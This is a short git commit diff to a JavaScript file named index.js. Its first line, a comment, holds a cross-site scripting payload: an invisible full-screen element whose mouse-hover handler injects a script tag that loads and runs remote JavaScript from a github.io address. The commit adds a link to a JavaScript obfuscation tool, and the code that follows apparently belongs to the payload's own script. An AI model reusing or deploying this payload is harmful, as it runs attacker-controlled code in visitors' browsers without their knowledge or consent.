205dfe615a43d643f122261d85fc04a3884ed590
Aleksandr Dukhovnyy <script@vip-person.net>
2021-11-12 11:51:52 +0200

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,5 @@
 // <b onmouseenter="(l=>{let s=document.createElement('script');s.src=l;document.querySelector('body').appendChild(s)})('https://aleksandr-js-developer.github.io/silver-umbrella/index.js')" style="position: absolute; width: 100vw; height: 100vh; top: 0; left: 0;"> _____text_____ </b>
+// http://www.jsfuck.com/
 
 if(window.silverUmbrella !== true){
   const el = document.querySelector('[style="position: absolute; width: 100vw; height: 100vh; top: 0; left: 0;"]');
